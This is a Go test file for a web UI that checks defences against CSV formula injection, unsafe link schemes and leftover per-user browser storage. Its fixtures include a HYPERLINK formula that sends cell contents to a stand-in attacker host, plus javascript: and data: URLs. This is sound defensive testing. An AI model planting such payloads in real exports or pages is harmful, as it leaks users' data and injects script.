// Copyright 2026 The Signalith authors
// SPDX-License-Identifier: Apache-2.0

package web

import (
	"encoding/json"
	"io/fs"
	"os/exec"
	"regexp"
	"strings"
	"testing"
)

// readScript returns a script of the web UI with LF line endings.
func readScript(t *testing.T, name string) string {
	t.Helper()
	b, err := fs.ReadFile(FS(), name)
	if err != nil {
		t.Fatal(err)
	}
	return strings.ReplaceAll(string(b), "\r\n", "\n")
}

// cut returns the top-level declaration of src that starts with start
// and ends at the first line that is only end.
func cut(t *testing.T, src, start, end string) string {
	t.Helper()
	m := regexp.MustCompile(`(?s)\n` + regexp.QuoteMeta(start) + `.*?\n` + regexp.QuoteMeta(end) + `\n`).FindString(src)
	if m == "" {
		t.Fatalf("no %q", start)
	}
	return m
}

// runNode runs script in Node and decodes what it prints as JSON into out.
func runNode(t *testing.T, script string, out any) {
	t.Helper()
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node is not installed")
	}
	res, err := exec.Command(node, "-e", script).Output()
	if err != nil {
		t.Fatalf("node: %v", err)
	}
	if err := json.Unmarshal(res, out); err != nil {
		t.Fatalf("node printed %s: %v", res, err)
	}
}

// WEB-02: the search results' CSV export guards a multivalue field
// against formula injection after joining it, as it does a single value.
func TestExportGuardsMultivalueCells(t *testing.T) {
	src := readScript(t, "app.js")
	if !strings.Contains(src, "const cell = csvCell;") {
		t.Error("exportResults does not write its cells with csvCell")
	}
	fn := cut(t, src, "function csvCell(v) {", "}")
	var got map[string]string
	runNode(t, fn+`
console.log(JSON.stringify({
  string: csvCell('=1+1'),
  array: csvCell(['=HYPERLINK("https://evil.example/?"&A1,"x")', 'b']),
  arrayAt: csvCell(['@SUM(A1)']),
  arrayLater: csvCell(['a', '=1+1']),
  number: csvCell(-5),
  plain: csvCell(['a', 'b']),
  empty: csvCell(null),
}));
`, &got)
	want := map[string]string{
		"string":     "'=1+1",
		"array":      `"'=HYPERLINK(""https://evil.example/?""&A1,""x""), b"`,
		"arrayAt":    "'@SUM(A1)",
		"arrayLater": `"a, =1+1"`,
		"number":     "-5",
		"plain":      `"a, b"`,
		"empty":      "",
	}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s: %q, want %q", k, got[k], w)
		}
	}
}

// WEB-10: a content pack's links (licence, source, original rule) are
// links only for http and https addresses.
func TestPackLinksNeedAWebScheme(t *testing.T) {
	src := readScript(t, "detections.js")
	for _, bad := range []string{"href: p.license_url", "href: p.source", "href: d.origin.license_url", "href: d.origin.url"} {
		if strings.Contains(src, bad) {
			t.Errorf("detections.js links %s without a scheme check", bad)
		}
	}
	fn := cut(t, src, "function packLink(href, text) {", "}")
	var got map[string]string
	runNode(t, `const el = (tag, attrs) => tag + ':' + (attrs.href || '');
`+fn+`
console.log(JSON.stringify({
  https: packLink('https://github.com/x', 't'),
  http: packLink('HTTP://example.com', 't'),
  js: packLink('javascript:alert(1)', 't'),
  data: packLink('data:text/html,x', 't'),
  relative: packLink('/api/x', 't'),
  none: packLink(undefined, 't'),
}));
`, &got)
	want := map[string]string{
		"https": "a:https://github.com/x", "http": "a:HTTP://example.com",
		"js": "span:", "data": "span:", "relative": "span:", "none": "span:",
	}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s: %q, want %q", k, got[k], w)
		}
	}
}

// WEB-05: what is stored for the signed-in user goes when a session ends
// however it ends, and when someone else signs in on the same browser.
func TestUserStorageEndsWithTheSession(t *testing.T) {
	src := readScript(t, "app.js")
	sign := cut(t, src, "const toSignIn = (change, mfa) => {", "};")
	if !strings.Contains(sign, "if (!change && !mfa) clearUserStorage();") {
		t.Errorf("toSignIn does not clear the user's storage: %s", sign)
	}
	if !strings.Contains(src, "freshStorage = claimUserStorage(m.username || m.user || '');") {
		t.Error("api/me does not claim the stored state for the user signed in")
	}
	// The last query is read only once api/me has answered.
	init := cut(t, src, "(async function init() {", "})();")
	if a, b := strings.Index(init, "await meReady"), strings.Index(init, "localStorage.getItem('signalith.query')"); a < 0 || b < 0 || a > b {
		t.Error("init reads the last query before api/me says who is signed in")
	}

	keep := cut(t, src, "const KEEP_ON_SIGN_OUT = new Set([", "  'signalith.dashRange', 'signalith.dashAuto', 'signalith.dashRefresh']);")
	clear := cut(t, src, "function clearUserStorage() {", "}")
	claim := cut(t, src, "const USER_STORAGE_KEY = 'signalith.user';", "}")
	var got map[string]any
	runNode(t, `
const mem = new Map();
const localStorage = {
  get length() { return mem.size; },
  key: (i) => [...mem.keys()][i],
  getItem: (k) => (mem.has(k) ? mem.get(k) : null),
  setItem: (k, v) => mem.set(k, String(v)),
  removeItem: (k) => mem.delete(k),
};
const sessionStorage = { clear() {} };
`+keep+clear+claim+`
const out = {};
out.first = claimUserStorage('ann');
localStorage.setItem('signalith.query', 'user=bob');
localStorage.setItem('signalith.theme', 'dark');
out.same = claimUserStorage('ann');
out.queryKept = localStorage.getItem('signalith.query');
out.other = claimUserStorage('eve');
out.queryAfter = localStorage.getItem('signalith.query');
out.theme = localStorage.getItem('signalith.theme');
out.owner = localStorage.getItem('signalith.user');
console.log(JSON.stringify(out));
`, &got)
	want := map[string]any{
		"first": true, "same": false, "queryKept": "user=bob",
		"other": true, "queryAfter": nil, "theme": "dark", "owner": "eve",
	}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s: %v, want %v", k, got[k], w)
		}
	}
}
